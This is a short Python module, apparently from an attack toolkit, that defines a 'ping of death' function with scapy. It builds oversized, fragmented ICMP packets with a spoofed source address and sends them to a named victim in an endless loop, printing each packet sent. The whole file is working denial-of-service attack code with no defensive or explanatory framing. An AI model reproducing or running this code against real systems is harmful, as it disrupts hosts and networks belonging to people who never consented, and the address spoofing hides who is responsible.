from scapy.all import *
from func.spoof_addr import spoof_addr
from time import sleep

def ping_of_death(victim,quiet,terminal = None):
    try:
        spoofaddr = spoof_addr(terminal = terminal)
        packet = fragment(IP(src=spoofaddr,dst=victim)/ICMP()/("w"*60000))

        if terminal == None:
            print("[+] Sending malformed ICMP packets to "+victim)
        else:
            terminal.write('\n[+] Sending malformed ICMP packets to '+victim)

        while True:
            for p in packet:
                send(p,verbose=0)
                if not quiet:
                    if terminal == None:
                        print("[+] Packet Sent // "+p.summary())
                    else:
                        terminal.write('\n[+] Packet Sent // '+str(p.summary()))
            sleep(2)
    except Exception as s:
        if terminal == None:
            print(s)
        else:
            terminal.write('\n'+str(s))
